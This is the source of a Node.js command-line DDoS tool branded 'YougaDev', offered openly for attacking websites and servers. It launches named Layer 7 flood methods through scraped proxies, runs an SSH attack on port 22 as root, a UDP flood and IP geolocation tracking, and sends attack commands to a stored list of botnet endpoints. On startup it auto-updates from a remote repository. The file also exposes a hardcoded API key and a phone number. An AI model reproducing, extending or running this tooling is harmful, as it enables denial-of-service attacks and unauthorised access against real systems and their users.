#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
  console.clear();
  const text = 'WELCOME BACK TO TOOLS DDOS YOUGADEV NETWORK';
  const text1 = 'YOUGADEV X TOOLS DDOS ATTACK 2024-2025';
  const text2 = 'T.me/YougaDev_Network';
  const text3 = 'Layer7 X Layer4';
  const text4 = `⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀`;
const text5 = 'TimeLimit [ 9999 ] | VIP [ true ] | SUPERVIP [ true ]';
const text6 = 'Creator : T.me/YougaDev_Network';
  const terminalWidth = process.stdout.columns;

  // Fungsi untuk memusatkan teks di terminal
  const centerText = (text) => text.split('\n').map(line => line.padStart((terminalWidth + line.length) / 2)).join('\n');

  // Pusatkan teks
  const centeredText = text.padStart((terminalWidth + text.length) / 2);
  const centeredText1 = text1.padStart((terminalWidth + text1.length) / 2);
  const centeredText2 = text2.padStart((terminalWidth + text2.length) / 2);
  const centeredText3 = text3.padStart((terminalWidth + text3.length) / 2);
  const centeredText4 = centerText(text4);
  const centeredText5 = text5.padStart((terminalWidth + text5.length) / 2);
  const centeredText6 = text6.padStart((terminalWidth + text6.length) / 2);

  console.log(`
\x1b[1m\x1b[36m${centeredText4}\x1b[0m
${centeredText3}
\x1b[1m\x1b[36m${centeredText}\x1b[0m
\x1b[1m\x1b[36m${centeredText1}\x1b[0m

\x1b[1m\x1b[36m${centeredText2}\x1b[0m
${centeredText5}
\x1b[1m\x1b[36m${centeredText6}\x1b[0m

-----------------------------------------------------------------
TYPE \x1b[1m\x1b[36m"HELP"\x1b[0m FOR SHOWING ALL AVAILABLE COMMAND
`);
}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`Loading, please wait...`);

    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);
    console.log(`Dependencies installed...`);

    const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
    const latestVersion = await getLatestVersion.text();
    console.log(`Checking version...`);

    if (version === latestVersion.trim()) {
      console.log(`Version is up to date...`);

      await scrapeProxy();
      console.log(`Proxies scraped...`);

      await scrapeUserAgent();
      console.log(`User agents scraped...`);

      await sleep(700);
      console.clear();
      console.log(`Welcome To YougaDev Tools ${version}`);
      await sleep(1000);
      await banner();
      sigma();
    } else {
      console.log(`This version is outdated. ${version} => ${latestVersion.trim()}`);
      console.log(`Waiting for auto-update...`);

      await exec(`npm uninstall -g prmnmd-tuls`);
      console.log(`Uninstalling outdated version...`);

      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Installing updated version...`);

      console.log(`Restart the tools, please.`);
      process.exit();
    }
  } catch (error) {
    console.log(`Are you online?`);
  }
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋    [ \x1b[1m\x1b[36mCreator   : YougaDev\x1b[0m ]
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋    ⠀ [ \x1b[1m\x1b[36mVip       : true\x1b[0m ]
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀      [ \x1b[1m\x1b[36mPremium   : true\x1b[0m ]
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀   ⠀ ⠀[ \x1b[1m\x1b[36mTelegram  :t.me/YougaDev_Network\x1b[0m ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀   ⠀ ⠀⠀[ \x1b[1m\x1b[36mWhatsApp  : 0831-5144-3585\x1b[0m ]
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀    ⠀ [ \x1b[1m\x1b[36mTimeLimit : 99999\x1b[0m ]
-----------------------------------------------------------------
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.log(`Attack Details
   Status:   [ \x1b[1m\x1b[32mAttack Send Succesfully By YougaDev_Network\x1b[0m ]
   Target:   [ \x1b[1m\x1b[36m${target}\x1b[0m ]
   Duration: [ \x1b[1m\x1b[36m${duration}\x1b[0m ]
   Methods:  [ \x1b[1m\x1b[36m${methods}\x1b[0m ]
   Rps:      [ \x1b[1m\x1b[36m100\x1b[0m ]
   Thread:   [ \x1b[1m\x1b[36m15\x1b[0m ]
Target Details
   ISP:      [ \x1b[1m\x1b[36m${result.isp}\x1b[0m ]
   Ip:       [ \x1b[1m\x1b[36m${result.query}\x1b[0m ]
   AS:       [ \x1b[1m\x1b[36m${result.as}\x1b[0m ]
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 15 9`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 15 9`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 15 9 proxy.txt`)
          sigma()
         }else if (methods === 'nuke') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 15 9 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 15 9 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 15 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 15 9 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 15 9 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, '/lib/cache/storm');
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 15 9 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 15 9 proxy.txt`)
        exec(`node ${rape} ${duration} 9 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋    [ \x1b[1m\x1b[36mCreator   : YougaDev\x1b[0m ]
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋    ⠀ [ \x1b[1m\x1b[36mVip       : true\x1b[0m ]
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀      [ \x1b[1m\x1b[36mPremium   : true\x1b[0m ]
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀   ⠀ ⠀[ \x1b[1m\x1b[36mTelegram  : t.me/YougaDev_Network\x1b[0m ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀   ⠀ ⠀⠀[ \x1b[1m\x1b[36mWhatsApp  : 0831-5144-3585\x1b[0m ]
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀    ⠀ [ \x1b[1m\x1b[36mTimeLimit : 99999\x1b[0m ]
KETIK \x1b[1m\x1b[36m"CLS"\x1b[0m UNTUK KEMBALI KE MENU AWAL
-----------------------------------------------------------------
Target   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋    [ \x1b[1m\x1b[36mCreator   : YougaDev\x1b[0m ]
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋    ⠀ [ \x1b[1m\x1b[36mVip       : true\x1b[0m ]
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀      [ \x1b[1m\x1b[36mPremium   : true\x1b[0m ]
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀   ⠀ ⠀[ \x1b[1m\x1b[36mTelegram  : t.me/YougaDev_Network\x1b[0m ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀   ⠀ ⠀⠀[ \x1b[1m\x1b[36mWhatsApp  : 0831-5144-3585\x1b[0m ]
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀    ⠀ [ \x1b[1m\x1b[36mTimeLimit : 99999\x1b[0m ]
KETIK \x1b[1m\x1b[36m"CLS"\x1b[0m UNTUK KEMBALI KE MENU AWAL
-----------------------------------------------------------------
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : YougaDev`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋    [ \x1b[1m\x1b[36mCreator   : YougaDev\x1b[0m ]
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋    ⠀ [ \x1b[1m\x1b[36mVip       : true\x1b[0m ]
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀      [ \x1b[1m\x1b[36mPremium   : true\x1b[0m ]
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀   ⠀ ⠀[ \x1b[1m\x1b[36mTelegram  : t.me/YougaDev_Network\x1b[0m ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀   ⠀ ⠀⠀[ \x1b[1m\x1b[36mWhatsApp  : 0831-5144-3585\x1b[0m ]
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀    ⠀ [ \x1b[1m\x1b[36mTimeLimit : 99999\x1b[0m ]
KETIK \x1b[1m\x1b[36m"CLS"\x1b[0m UNTUK KEMBALI KE MENU AWAL
-----------------------------------------------------------------
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : YougaDev`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By YougaDev_Network

Thx To:
ChatGPT ( Fixing Error )
IrfanNotSepuh ( Gatau Ngapain )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
Allah SWT
`
permen.question('\x1b[1m\x1b[36m┌──</>[YougaDev]\n└───</>➤\x1b[0m ', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'HELP') {
    console.log(`Home         | Description
-----------------------------------------------------------------
METHODS      | SHOW LIST METHODS
ATTACK       | START DDOS
KILL-SSH     | KILL VPS ACCES
UDP-RAW      | LAUNCH UDP FLOOR ATTACK
ONGOING      | SHOW ONGOING ATTACK
CREADITS     | SHOW CREATOR OF THESE TOOLS
CLS          | CLEAR TERMINAL
`);
    sigma();
  } else if (command === 'METHODS') {
    console.log(`Methods    | Description                                   | sts
-----------------------------------------------------------------
FLOOD      | Layer7 - Vip Attack Url                       | on
TLS        | Layer7 - Vip Attack Url                       | on
STRIKE     | Layer7 - Vip Attack Url                       | on
KILL       | Layer7 - Vip Attack Url                       | on
RAW        | Layer7 - Vip Attack Url                       | on
BYPASS     | Layer7 - Vip Attack Url                       | on
THUNDER    | Layer7 - Vip Attack Url                       | on
STORM      | Layer7 - Vip Attack Url                       | on
RAPE       | Layer7 - Vip Attack Url                       | on
DESTROY    | Layer7 - Vip Attack Url                       | on
SLIM       | Layer7 - Vip Attack Url                       | on
NUKE       | Layer7 - Vip Attack Url                       | on
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'CREADITS') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'ATTACK') {
    handleAttackCommand(args);
  }  else if (command === 'ADD-BOTNET') {
    processBotnetEndpoint(args);
  }  else if (command === 'DDOS') {
    processBotnetAttack(args);
  } else if (command === 'KILL-SSH') {
    killSSH(args);
  } else if (command === 'UDP-RAW') {
    udp_flood(args);
  } else if (command === 'TRACK-IP') {
    trackIP(args);
  } else if (command === 'ONGOING') {
    ongoingAttack()
    sigma()
  } else if (command === 'CLS') {
    banner()
    sigma()
    } else {
    console.log(`${command} NOT FOUND`);
    sigma();
  }
});
}
// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: ADD-BOTNET <endpoints>
ADD-BOTNET http://1.1.1.1:2000/skyran`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/skyran';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

// [========================================] //
async function processBotnetAttack(args) {
    // Daftar metode yang valid
    const validMethods = [
        'browsers', 'bypass', 'kill', 'strike', 'tls', 
        'ninja', 'mix', 'raw', 'rape'
    ];

    if (args.length < 3) {
        console.log(`Example: BOTNET-ATTACK <target> <duration> <methods>
BOTNET-ATTACK https://example.com 120 flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;

    // Cek apakah metode yang digunakan valid
    if (!validMethods.includes(methods)) {
        console.log(`Invalid method. Available methods are: ${validMethods.join(', ')}`);
        sigma();
        return;
    }

    // Parse target hostname and fetch target details
    let result = { isp: 'Unknown', query: 'Unknown', as: 'Unknown' };
    try {
        const parsedUrl = new url.URL(target);
        const hostname = parsedUrl.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;
    } catch (error) {
        console.error('Error fetching target details:', error.message);
    }

    // Load botnet data
    let botnetData;
    try {
        const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
        botnetData = JSON.parse(data);
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    if (botnetData.endpoints.length === 0) {
        console.log('No botnet endpoints available for the attack.');
        return;
    }

    // Start the attack
    let successCount = 0;
    for (const endpoint of botnetData.endpoints) {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
        try {
            const response = await axios.get(apiUrl);
            if (response.status === 200) {
                successCount++;
            }
        } catch (error) {
            console.error(`Error attacking via ${endpoint}: ${error.message}`);
        }
    }

    // Output a single attack completion message
    console.log(`\nAttack Details
   Status:   [ \x1b[1m\x1b[32mAttack Completed\x1b[0m ]
   Botnet:   [ \x1b[1m\x1b[36m${successCount}\x1b[0m ]
   Target:   [ \x1b[1m\x1b[36m${target}\x1b[0m ]
   Duration: [ \x1b[1m\x1b[36m${duration}\x1b[0m ]
   Methods:  [ \x1b[1m\x1b[36m${methods}\x1b[0m ]
   Botnet Online: [ \x1b[1m\x1b[36m${successCount}\x1b[0m ]
   Rps:      [ \x1b[1m\x1b[36m100\x1b[0m ]
   Thread:   [ \x1b[1m\x1b[36m15\x1b[0m ]
Target Details
   ISP:      [ \x1b[1m\x1b[36m${result.isp}\x1b[0m ]
